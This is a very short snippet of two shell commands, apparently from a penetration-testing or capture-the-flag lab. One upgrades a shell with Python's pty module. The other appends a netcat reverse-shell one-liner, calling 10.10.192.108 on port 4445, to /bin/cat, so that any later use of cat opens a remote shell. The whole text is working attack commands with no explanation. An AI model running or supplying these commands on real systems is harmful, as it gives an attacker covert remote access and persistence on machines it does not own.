```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.192.108 4445 >/tmp/f" >> /bin/cat

```